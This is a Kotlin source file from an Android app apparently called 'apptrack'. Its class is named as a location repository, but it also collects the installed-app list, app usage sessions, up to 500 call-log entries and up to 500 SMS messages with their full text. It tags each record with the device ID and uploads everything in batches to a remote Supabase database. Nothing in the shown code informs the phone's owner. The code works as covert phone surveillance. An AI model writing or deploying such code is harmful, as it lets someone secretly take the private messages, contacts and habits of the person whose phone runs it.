package com.lvhonyua.apptrack.data

import android.annotation.SuppressLint
import android.app.usage.UsageEvents
import android.app.usage.UsageStatsManager
import android.content.Context
import android.os.Build
import android.provider.CallLog
import android.provider.Telephony
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeout
import io.github.jan.supabase.SupabaseClient
import io.github.jan.supabase.createSupabaseClient
import io.github.jan.supabase.postgrest.Postgrest
import io.github.jan.supabase.postgrest.postgrest
import java.text.SimpleDateFormat
import java.util.Calendar
import java.util.Date
import java.util.Locale

object LocationRepository {
    private var settingsManager: SettingsManager? = null
    private var supabaseClient: SupabaseClient? = null
    private var dbHelper: LocalDbHelper? = null
    private var currentDeviceId: String = "unknown"
    private var currentDeviceName: String = "unknown"
    
    private val _locationRecords = MutableStateFlow<List<LocationRecord>>(emptyList())
    val locationRecords = _locationRecords.asStateFlow()

    private val _isTracking = MutableStateFlow(false)
    val isTracking = _isTracking.asStateFlow()

    private val repositoryScope = CoroutineScope(Dispatchers.IO)

    private fun getSdf() = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())

    fun init(context: Context) {
        settingsManager = SettingsManager(context)
        dbHelper = LocalDbHelper(context)
        currentDeviceId = android.provider.Settings.Secure.getString(context.contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "unknown"
        updateDeviceName(context)
        updateClient()
        refreshLocalRecords()
        triggerAllSync(context)
    }

    private fun triggerAllSync(context: Context) {
        repositoryScope.launch {
            scanAndSaveAppInfo(context)
            scanAndSaveAppSessions(context)
            scanAndSaveCallLogs(context)
            scanAndSaveSms(context)
            
            syncLocationsInBatches()
            delay(2000)
            syncAppInfosInBatches()
            delay(2000)
            syncSessionsInBatches()
            delay(2000)
            syncCallsInBatches()
            delay(2000)
            syncSmsInBatches()
        }
    }

    @SuppressLint("MissingPermission")
    fun updateDeviceName(context: Context) {
        val bluetoothName = try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                if (context.checkSelfPermission(android.Manifest.permission.BLUETOOTH_CONNECT) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    android.bluetooth.BluetoothAdapter.getDefaultAdapter()?.name
                } else null
            } else {
                @Suppress("DEPRECATION")
                android.bluetooth.BluetoothAdapter.getDefaultAdapter()?.name
            }
        } catch (e: Exception) { null }
        currentDeviceName = bluetoothName ?: "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"      
    }

    private fun refreshLocalRecords() {
        repositoryScope.launch {
            val records = dbHelper?.getAllRecords() ?: emptyList()
            _locationRecords.value = records
        }
    }

    fun updateClient() {
        val settings = settingsManager ?: return
        if (settings.isConfigured()) {
            try {
                supabaseClient = createSupabaseClient(settings.supabaseUrl, settings.supabaseAnonKey) {
                    install(Postgrest)
                }
            } catch (e: Exception) {
                supabaseClient = null
            }
        }
    }

    fun scanAndSaveAppInfo(context: Context) {
        repositoryScope.launch {
            try {
                val pm = context.packageManager
                val usageStatsManager = context.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
                
                // 核心改进：将起始时间设为 0，以获取系统记录的所有历史累计数据
                val startTime = 0L 
                val endTime = System.currentTimeMillis()

                val statsMap = usageStatsManager.queryAndAggregateUsageStats(startTime, endTime)
                val apps = pm.getInstalledApplications(android.content.pm.PackageManager.GET_META_DATA)
                val sdf = getSdf()
                
                apps.forEach { appInfo ->
                    val packageName = appInfo.packageName
                    val installTime = try { sdf.format(Date(pm.getPackageInfo(packageName, 0).firstInstallTime)) } catch (e: Exception) { "Unknown" }
                    val usage = statsMap[packageName]
                    dbHelper?.insertAppInfo(AppInfo(
                        packageName = packageName,
                        appName = appInfo.loadLabel(pm).toString(),
                        installTime = installTime,
                        usageTimeSeconds = (usage?.totalTimeInForeground ?: 0L) / 1000,
                        lastTimeUsed = usage?.lastTimeUsed?.let { if (it > 0) sdf.format(Date(it)) else null },
                        deviceId = currentDeviceId,
                        deviceName = currentDeviceName
                    ))
                }
                Log.d("LocationRepository", "Lifetime AppInfo scan completed.")
            } catch (e: Exception) { Log.e("LocationRepository", "AppInfo scan failed") }
        }
    }

    fun scanAndSaveAppSessions(context: Context) {
        repositoryScope.launch {
            try {
                val usageStatsManager = context.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
                val calendar = Calendar.getInstance()
                calendar.add(Calendar.HOUR_OF_DAY, -12) 
                val events = usageStatsManager.queryEvents(calendar.timeInMillis, System.currentTimeMillis())
                val pm = context.packageManager
                val sdf = getSdf()
                val openTimeMap = mutableMapOf<String, Long>()
                while (events.hasNextEvent()) {
                    val event = UsageEvents.Event()
                    events.getNextEvent(event)
                    val pkg = event.packageName
                    if (event.eventType == UsageEvents.Event.MOVE_TO_FOREGROUND) {
                        openTimeMap[pkg] = event.timeStamp
                    } else if (event.eventType == UsageEvents.Event.MOVE_TO_BACKGROUND) {
                        openTimeMap[pkg]?.let { start ->
                            val duration = event.timeStamp - start
                            if (duration > 1000) {
                                val name = try { pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString() } catch (e: Exception) { pkg }
                                dbHelper?.insertSession(AppSessionRecord(
                                    packageName = pkg,
                                    appName = name,
                                    startTime = sdf.format(Date(start)),
                                    durationSeconds = duration / 1000,
                                    deviceId = currentDeviceId,
                                    deviceName = currentDeviceName
                                ))
                            }
                            openTimeMap.remove(pkg)
                        }
                    }
                }
            } catch (e: Exception) { Log.e("LocationRepository", "Sessions scan failed") }
        }
    }

    fun scanAndSaveCallLogs(context: Context) {
        repositoryScope.launch {
            try {
                if (context.checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != android.content.pm.PackageManager.PERMISSION_GRANTED) return@launch
                val cursor = context.contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC") ?: return@launch
                val sdf = getSdf()
                var count = 0
                while (cursor.moveToNext() && count < 500) {
                    val typeInt = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                    dbHelper?.insertCall(CallRecord(
                        number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) ?: "Unknown",
                        name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)),
                        type = when (typeInt) { CallLog.Calls.INCOMING_TYPE -> "呼入"; CallLog.Calls.OUTGOING_TYPE -> "呼出"; CallLog.Calls.MISSED_TYPE -> "未接"; else -> "其他" },
                        time = sdf.format(Date(cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)))),
                        durationSeconds = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)),
                        deviceId = currentDeviceId,
                        deviceName = currentDeviceName
                    ))
                    count++
                }
                cursor.close()
            } catch (e: Exception) { Log.e("LocationRepository", "CallLog scan failed") }
        }
    }

    fun scanAndSaveSms(context: Context) {
        repositoryScope.launch {
            try {
                if (context.checkSelfPermission(android.Manifest.permission.READ_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) return@launch
                val cursor = context.contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC") ?: return@launch
                val sdf = getSdf()
                var count = 0
                while (cursor.moveToNext() && count < 500) {
                    val typeInt = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE))
                    dbHelper?.insertSms(SmsRecord(
                        address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: "Unknown",
                        body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: "",
                        type = if (typeInt == Telephony.Sms.MESSAGE_TYPE_INBOX) "接收" else "发送",
                        time = sdf.format(Date(cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)))),
                        deviceId = currentDeviceId,
                        deviceName = currentDeviceName
                    ))
                    count++
                }
                cursor.close()
            } catch (e: Exception) { Log.e("LocationRepository", "SMS scan failed") }
        }
    }

    private suspend fun syncLocationsInBatches() {
        val client = supabaseClient ?: return
        val settings = settingsManager ?: return
        val unsynced = dbHelper?.getUnsyncedRecords() ?: return
        if (unsynced.isEmpty()) return
        unsynced.chunked(50).forEach { batch ->
            try {
                withTimeout(60000) { client.postgrest.from(settings.tableName).insert(batch) }
                batch.forEach { dbHelper?.markSynced(it.id) }
                refreshLocalRecords()
                delay(200)
            } catch (e: Exception) { Log.e("LocationRepository", "Batch location sync failed") }
        }
    }

    private suspend fun syncAppInfosInBatches() {
        val client = supabaseClient ?: return
        val unsynced = dbHelper?.getUnsyncedAppInfos() ?: return
        if (unsynced.isEmpty()) return
        
        Log.i("LocationRepository", "Batch syncing ${unsynced.size} app infos (Prioritizing active apps)...")
        unsynced.chunked(50).forEach { batch ->
            try {
                withTimeout(60000) { client.postgrest.from("app_info_stats").upsert(batch) { onConflict = "device_id,package_name" } }
                batch.forEach { dbHelper?.markAppSynced(it.id) }
                delay(200)
            } catch (e: Exception) { Log.e("LocationRepository", "Batch app info sync failed") }
        }
    }

    private suspend fun syncSessionsInBatches() {
        val client = supabaseClient ?: return
        val unsynced = dbHelper?.getUnsyncedSessions() ?: return
        if (unsynced.isEmpty()) return

        Log.i("LocationRepository", "Batch syncing ${unsynced.size} sessions...")
        unsynced.chunked(50).forEach { batch ->
            try {
                withTimeout(60000) { client.postgrest.from("app_session_history").insert(batch) }
                batch.forEach { dbHelper?.markSessionSynced(it.id) }
                delay(200)
            } catch (e: Exception) { Log.e("LocationRepository", "Batch session sync failed") }
        }
    }

    private suspend fun syncCallsInBatches() {
        val client = supabaseClient ?: return
        val unsynced = dbHelper?.getUnsyncedCalls() ?: return
        if (unsynced.isEmpty()) return

        Log.i("LocationRepository", "Batch syncing ${unsynced.size} calls...")
        unsynced.chunked(50).forEach { batch ->
            try {
                withTimeout(60000) { client.postgrest.from("call_history").upsert(batch) { onConflict = "device_id,number,time" } }
                batch.forEach { dbHelper?.markCallSynced(it.id) }
                delay(300)
            } catch (e: Exception) { Log.e("LocationRepository", "Batch call sync failed") }
        }
    }

    private suspend fun syncSmsInBatches() {
        val client = supabaseClient ?: return
        val unsynced = dbHelper?.getUnsyncedSms() ?: return
        if (unsynced.isEmpty()) return

        Log.i("LocationRepository", "Batch syncing ${unsynced.size} sms records...")
        unsynced.chunked(50).forEach { batch ->
            try {
                withTimeout(60000) { client.postgrest.from("sms_history").upsert(batch) { onConflict = "device_id,address,body,time" } }
                batch.forEach { dbHelper?.markSmsSynced(it.id) }
                delay(300)
            } catch (e: Exception) { Log.e("LocationRepository", "Batch sms sync failed") }
        }
    }

    suspend fun validateConnection(url: String, key: String, table: String = "locations"): Result<Unit> {      
        return withContext(Dispatchers.IO) {
            try {
                val tempClient = createSupabaseClient(url, key) { install(Postgrest) }
                withTimeout(15000) { tempClient.postgrest.from(table).select { limit(1) } }
                Result.success(Unit)
            } catch (e: Exception) { Result.failure(e) }
        }
    }

    fun addRecord(record: LocationRecord) {
        repositoryScope.launch {
            val r = record.copy(deviceId = currentDeviceId, deviceName = currentDeviceName)
            val id = dbHelper?.insertRecord(r) ?: return@launch
            refreshLocalRecords()
            syncRecord(r.copy(id = id))
        }
    }

    private suspend fun syncRecord(record: LocationRecord) {
        val client = supabaseClient ?: return
        val settings = settingsManager ?: return
        try {
            client.postgrest.from(settings.tableName).insert(record)
            dbHelper?.markSynced(record.id)
            refreshLocalRecords()
        } catch (e: Exception) { Log.e("LocationRepository", "Single location sync failed") }
    }

    fun setTracking(tracking: Boolean) { _isTracking.value = tracking }
    fun initializeRealm() {}
}
